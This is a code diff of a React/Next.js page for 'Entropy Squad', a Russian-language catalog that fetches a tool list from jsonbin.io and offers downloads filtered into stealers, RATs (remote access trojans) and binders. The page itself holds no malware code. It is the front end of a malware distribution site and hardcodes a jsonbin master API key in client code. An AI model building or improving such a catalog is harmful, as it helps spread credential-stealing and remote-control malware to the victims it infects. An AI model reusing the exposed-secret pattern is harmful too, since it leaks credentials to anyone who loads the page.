@@ -1,256 +1,161 @@
 "use client";
 
-import { useState, useEffect } from "react";
-import Link from "next/link";
+import { useState, useEffect } from 'react';
+import Link from 'next/link';
 
-interface Tool {
-  id: number;
-  name: string;
-  description: string;
-  category: string;
-  downloadUrl: string;
-  fileName: string;
-}
-
-const API_KEY = "$2a$10$oHU2FwqpVRMsaa22tSabt.3rDdfQjyTwnpbSF25DCpfeVG9.AuX8W";
 const BIN_ID = "6a050660250b1311c348162d";
+const API_KEY = "$2a$10$oHU2FwqpVRMsaa22tSabt.3rDdfQjyTwnpbSF25DCpfeVG9.AuX8W";
 
-export default function CatalogPage() {
-  const [tools, setTools] = useState<Tool[]>([]);
+export default function Catalog() {
+  const [searchQuery, setSearchQuery] = useState('');
+  const [activeFilter, setActiveFilter] = useState('all');
+  const [isVisible, setIsVisible] = useState(false);
+  const [tools, setTools] = useState<any[]>([]);
   const [loading, setLoading] = useState(true);
-  const [searchQuery, setSearchQuery] = useState("");
-  const [activeCategory, setActiveCategory] = useState("all");
   const [downloadingId, setDownloadingId] = useState<number | null>(null);
 
   useEffect(() => {
-    const fetchTools = async () => {
-      try {
-        const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
-          headers: { "X-Master-Key": API_KEY },
-        });
-        const data = await res.json();
-        setTools(data.record.tools || []);
-      } catch (err) {
-        console.error("Ошибка загрузки тулзов:", err);
-      } finally {
-        setLoading(false);
-      }
-    };
+    setIsVisible(true);
     fetchTools();
   }, []);
 
-  const filtered = tools.filter((tool) => {
-    const matchesSearch =
-      tool.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
-      tool.description.toLowerCase().includes(searchQuery.toLowerCase());
-    const matchesCategory =
-      activeCategory === "all" || tool.category === activeCategory;
-    return matchesSearch && matchesCategory;
+  const fetchTools = async () => {
+    try {
+      const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
+        headers: { 'X-Master-Key': API_KEY }
+      });
+      const data = await res.json();
+      setTools(data.record.tools || []);
+    } catch (e) {
+      console.error("Ошибка загрузки:", e);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  const handleDownload = (tool: any) => {
+    if (!tool.link) {
+      alert("Ссылка на скачивание отсутствует");
+      return;
+    }
+    setDownloadingId(tool.id);
+    setTimeout(() => setDownloadingId(null), 1000);
+    window.open(tool.link, '_blank', 'noopener,noreferrer');
+  };
+
+  const filteredTools = tools.filter((tool: any) => {
+    const matchesSearch = tool.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
+                          tool.desc.toLowerCase().includes(searchQuery.toLowerCase());
+    const matchesFilter = activeFilter === 'all' || tool.category === activeFilter;
+    return matchesSearch && matchesFilter;
   });
 
-  const handleDownload = async (tool: Tool) => {
-    setDownloadingId(tool.id);
-    try {
-      const response = await fetch(tool.downloadUrl);
-      const blob = await response.blob();
-      const url = window.URL.createObjectURL(blob);
-      const a = document.createElement("a");
-      a.href = url;
-      a.download = tool.fileName;
-      document.body.appendChild(a);
-      a.click();
-      a.remove();
-      window.URL.revokeObjectURL(url);
-    } catch (err) {
-      console.error("Ошибка скачивания:", err);
-    } finally {
-      setDownloadingId(null);
-    }
-  };
-
   const getCategoryLabel = (cat: string) => {
-    switch (cat) {
-      case "stealer":
-        return { label: "СТИЛЕР", color: "#ef4444" };
-      case "rat":
-        return { label: "РАТ", color: "#3b82f6" };
-      case "binder":
-        return { label: "БИНДЕР", color: "#22c55e" };
-      default:
-        return { label: cat.toUpperCase(), color: "#a855f7" };
+    switch(cat) {
+      case 'stealer': return 'СТИЛЕР';
+      case 'rat': return 'РАТ';
+      case 'binder': return 'БИНДЕР';
+      default: return cat.toUpperCase();
     }
   };
-
-  if (loading) {
-    return (
-      <div className="min-h-screen bg-[#0a0a0f] flex items-center justify-center">
-        <div className="text-white text-xl font-mono animate-pulse">
-          ЗАГРУЗКА...
-        </div>
-      </div>
-    );
-  }
 
   return (
-    <div className="min-h-screen bg-[#0a0a0f] text-white">
-      {/* НАВБАР */}
-      <nav className="border-b border-white/10 bg-black/40 backdrop-blur-md sticky top-0 z-50">
-        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-          <div className="flex items-center justify-between h-16">
-            <Link
-              href="/"
-              className="text-sm font-mono tracking-widest text-white/60 hover:text-white transition-colors"
-            >
-              ← НАЗАД
-            </Link>
+    <div className="min-h-screen bg-black text-white overflow-hidden relative selection:bg-blue-500">
+      <div className="fixed inset-0 pointer-events-none">
+        <div className="absolute top-[-10%] left-[-10%] w-[120%] h-[120%] bg-[radial-gradient(circle_at_center,rgba(59,130,246,0.15),transparent_70%)] animate-pulse" />
+        <div className="absolute inset-0 bg-[radial-gradient(circle_at_top,#3B82FF11,transparent_50%)]" />
+      </div>
 
-            <div className="flex items-center gap-4">
-              <a
-                href="https://discord.gg/entropysquad"
-                target="_blank"
-                rel="noopener noreferrer"
-                className="px-4 py-1.5 text-sm font-mono tracking-wider rounded border border-[#5865f2]/30 text-[#5865f2] hover:bg-[#5865f2]/10 transition-all"
-              >
-                JOIN DISCORD
-              </a>
-
-              <Link
-                href="/admin"
-                className="px-4 py-1.5 text-sm font-mono tracking-wider rounded border border-white/10 text-white/40 hover:text-white/70 hover:border-white/20 transition-all"
-              >
-                ADMIN
-              </Link>
-            </div>
+      <nav className="relative z-10 flex items-center justify-between px-8 py-6 border-b border-white/10 backdrop-blur-xl">
+        <Link href="/" className="flex items-center gap-4 text-2xl font-bold tracking-[0.3em] text-blue-400 drop-shadow-[0_0_12px_rgba(59,130,246,0.9)] hover:text-blue-300 transition-all">
+          <div className="w-12 h-12 rounded-2xl overflow-hidden border border-blue-400/30 bg-black flex items-center justify-center shadow-[0_0_25px_rgba(59,130,246,0.45)]">
+            <span className="text-blue-400 font-black">E_S</span>
           </div>
+          ENTROPY SQUAD
+        </Link>
+        <div className="flex gap-4">
+          <Link href="/" className="px-5 py-2 rounded-2xl border border-zinc-500/40 bg-white/5 hover:bg-white/10 transition-all">← НАЗАД</Link>
+          <a href="https://discord.gg/vC3Pvn9Vfw" target="_blank" rel="noopener noreferrer" className="px-5 py-2 rounded-2xl border border-blue-500/40 bg-blue-500/10 hover:bg-blue-500/20 transition-all shadow-[0_0_20px_rgba(59,130,246,0.35)]">JOIN DISCORD</a>
+          <Link href="/admin" className="px-5 py-2 rounded-2xl border border-green-500/40 bg-green-500/10 hover:bg-green-500/20 transition-all shadow-[0_0_20px_rgba(34,197,94,0.2)]">ADMIN</Link>
         </div>
       </nav>
 
-      {/* ЗАГОЛОВОК */}
-      <div className="text-center pt-16 pb-8 px-4">
-        <h1 className="text-4xl sm:text-5xl font-bold font-mono tracking-tight bg-gradient-to-r from-purple-400 via-cyan-400 to-blue-400 text-transparent bg-clip-text">
-          КАТАЛОГ ИНСТРУМЕНТОВ
-        </h1>
-        <p className="mt-3 text-white/40 text-sm font-mono tracking-wider">
-          ENTROPY SQUAD // TOOLS DATABASE
-        </p>
-      </div>
-
-      {/* ПОИСК */}
-      <div className="max-w-xl mx-auto px-4 pb-6">
-        <div className="relative">
-          <input
-            type="text"
-            placeholder="ПОИСК ИНСТРУМЕНТОВ..."
-            value={searchQuery}
-            onChange={(e) => setSearchQuery(e.target.value)}
-            className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-3 pl-10 text-sm font-mono text-white placeholder-white/20 focus:outline-none focus:border-purple-500/50 focus:ring-1 focus:ring-purple-500/30 transition-all"
-          />
-          <svg
-            className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-white/20"
-            fill="none"
-            viewBox="0 0 24 24"
-            stroke="currentColor"
-          >
-            <path
-              strokeLinecap="round"
-              strokeLinejoin="round"
-              strokeWidth={2}
-              d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
-            />
-          </svg>
+      <section className={`relative z-10 px-8 py-16 max-w-7xl mx-auto transition-all duration-1000 ${isVisible ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-10'}`}>
+        <div className="mb-14 text-center">
+          <h3 className="text-5xl md:text-7xl font-black tracking-[0.15em] text-blue-400 drop-shadow-[0_0_20px_rgba(59,130,246,0.8)]">TOOLS CATALOG</h3>
+          <p className="text-zinc-500 mt-4 tracking-wider">Выберите инструмент для ваших задач</p>
         </div>
-      </div>
 
-      {/* ФИЛЬТР ПО КАТЕГОРИЯМ */}
-      <div className="flex justify-center gap-2 flex-wrap px-4 pb-10">
-        {[
-          { key: "all", label: "ВСЕ" },
-          { key: "stealer", label: "СТИЛЕРЫ" },
-          { key: "rat", label: "РАТКИ" },
-          { key: "binder", label: "БИНДЕРЫ" },
-        ].map((cat) => (
-          <button
-            key={cat.key}
-            onClick={() => setActiveCategory(cat.key)}
-            className={`px-5 py-2 rounded-lg text-xs font-mono tracking-widest border transition-all ${
-              activeCategory === cat.key
-                ? "bg-purple-600/20 border-purple-500/50 text-purple-300 shadow-[0_0_15px_rgba(168,85,247,0.15)]"
-                : "bg-white/5 border-white/10 text-white/40 hover:text-white/70 hover:border-white/20"
-            }`}
-          >
-            {cat.label}
-          </button>
-        ))}
-      </div>
+        <div className="mb-8">
+          <input type="text" value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)} placeholder="🔍 Поиск по названию или описанию..." className="w-full bg-white/5 border border-white/10 rounded-xl px-5 py-4 outline-none focus:border-blue-500 text-white placeholder-zinc-500 text-lg transition-all" />
+        </div>
 
-      {/* СЕТКА КАРТОЧЕК */}
-      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pb-20">
-        {filtered.length === 0 ? (
-          <div className="text-center py-20">
-            <p className="text-white/20 font-mono text-sm tracking-widest">
-              НИЧЕГО НЕ НАЙДЕНО
-            </p>
+        <div className="flex gap-3 flex-wrap mb-12">
+          {[
+            { key: 'all', label: 'ВСЕ' },
+            { key: 'stealer', label: 'СТИЛЕРЫ' },
+            { key: 'rat', label: 'РАТКИ' },
+            { key: 'binder', label: 'БИНДЕРЫ' },
+          ].map((filter) => (
+            <button key={filter.key} onClick={() => setActiveFilter(filter.key)}
+              className={`px-6 py-3 rounded-xl font-bold tracking-wider transition-all ${
+                activeFilter === filter.key
+                  ? 'bg-blue-600 text-white shadow-[0_0_25px_rgba(37,99,235,0.6)] scale-105'
+                  : 'bg-white/5 border border-white/10 text-zinc-400 hover:bg-white/10 hover:text-zinc-200'
+              }`}>{filter.label}</button>
+          ))}
+        </div>
+
+        {loading ? (
+          <div className="text-center py-20 text-zinc-500">
+            <div className="text-4xl mb-4 animate-pulse">⏳</div>
+            <p className="text-xl">ЗАГРУЗКА ИНСТРУМЕНТОВ...</p>
           </div>
         ) : (
-          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
-            {filtered.map((tool) => {
-              const { label, color } = getCategoryLabel(tool.category);
-
-              return (
-                <div
-                  key={tool.id}
-                  className="group relative bg-white/[0.03] border border-white/10 rounded-xl p-6 hover:border-white/20 transition-all duration-300 hover:shadow-[0_0_30px_rgba(168,85,247,0.08)]"
-                >
-                  {/* ID */}
-                  <div className="absolute top-3 right-3 text-[10px] font-mono text-white/10">
-                    #{tool.id}
+          <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
+            {filteredTools.length > 0 ? filteredTools.map((tool: any, index: number) => (
+              <div key={tool.id}
+                className={`group relative p-8 rounded-3xl border border-blue-500/20 bg-gradient-to-b from-blue-500/10 to-black hover:scale-[1.02] transition-all duration-500 overflow-hidden ${
+                  isVisible ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-10'
+                }`}
+                style={{ transitionDelay: `${index * 100}ms` }}
+              >
+                <div className="absolute inset-0 opacity-20 bg-[radial-gradient(circle,#3B82FF,transparent_70%)] group-hover:opacity-40 transition-opacity" />
+                <div className="relative z-10">
+                  <div className="flex items-center justify-between mb-2">
+                    <div className="text-2xl font-black tracking-widest text-white">{tool.name}</div>
+                    <span className={`text-xs px-3 py-1 rounded-full uppercase tracking-wider ${
+                      tool.category === 'stealer' ? 'bg-red-500/20 text-red-400 border border-red-500/30' :
+                      tool.category === 'rat' ? 'bg-purple-500/20 text-purple-400 border border-purple-500/30' :
+                      'bg-green-500/20 text-green-400 border border-green-500/30'
+                    }`}>{getCategoryLabel(tool.category)}</span>
                   </div>
-
-                  {/* НАЗВАНИЕ */}
-                  <h3 className="text-lg font-bold font-mono tracking-tight text-white/90 mb-3">
-                    {tool.name}
-                  </h3>
-
-                  {/* КАТЕГОРИЯ */}
-                  <span
-                    className="inline-block px-3 py-1 rounded text-[10px] font-mono tracking-widest font-semibold mb-4"
-                    style={{
-                      backgroundColor: `${color}15`,
-                      color: color,
-                      border: `1px solid ${color}30`,
-                    }}
-                  >
-                    {label}
-                  </span>
-
-                  {/* ОПИСАНИЕ */}
-                  <p className="text-sm text-white/50 font-mono leading-relaxed mb-5 min-h-[40px]">
-                    {tool.description}
-                  </p>
-
-                  {/* СКАЧАТЬ */}
+                  <p className="text-zinc-400 leading-relaxed mb-6 mt-4">{tool.desc}</p>
                   <button
                     onClick={() => handleDownload(tool)}
                     disabled={downloadingId === tool.id}
-                    className="w-full py-2.5 rounded-lg text-sm font-mono tracking-widest bg-gradient-to-r from-purple-600/30 to-blue-600/30 border border-purple-500/30 text-white/80 hover:from-purple-600/50 hover:to-blue-600/50 hover:border-purple-500/60 hover:shadow-[0_0_20px_rgba(168,85,247,0.15)] transition-all duration-300 disabled:opacity-40 disabled:cursor-not-allowed"
+                    className={`px-6 py-3 rounded-xl font-semibold tracking-wider transition-all ${
+                      tool.link
+                        ? 'bg-blue-500/20 border border-blue-400/30 hover:bg-blue-500/30 cursor-pointer'
+                        : 'bg-zinc-800/50 border border-zinc-700/30 text-zinc-500 cursor-not-allowed'
+                    }`}
                   >
-                    {downloadingId === tool.id
-                      ? "СКАЧИВАНИЕ..."
-                      : "СКАЧАТЬ"}
+                    {downloadingId === tool.id ? 'ОТКРЫВАЕМ...' : tool.link ? 'СКАЧАТЬ' : 'НЕТ ССЫЛКИ'}
                   </button>
                 </div>
-              );
-            })}
+              </div>
+            )) : (
+              <div className="col-span-full text-center py-20 text-zinc-500">
+                <div className="text-6xl mb-6">🔍</div>
+                <p className="text-3xl font-bold mb-2">НИЧЕГО НЕ НАЙДЕНО</p>
+                <p className="text-zinc-600">Попробуй изменить поиск или фильтр</p>
+              </div>
+            )}
           </div>
         )}
-      </div>
+      </section>
 
-      {/* ФУТЕР */}
-      <footer className="border-t border-white/5 py-8 text-center">
-        <p className="text-xs font-mono tracking-widest text-white/10">
-          ENTROPY SQUAD // ALL RIGHTS RESERVED
-        </p>
-      </footer>
+      <footer className="relative z-10 border-t border-white/10 py-8 text-center text-zinc-500 tracking-[0.3em] text-sm">ENTROPY SQUAD © 2026</footer>
     </div>
   );
 }
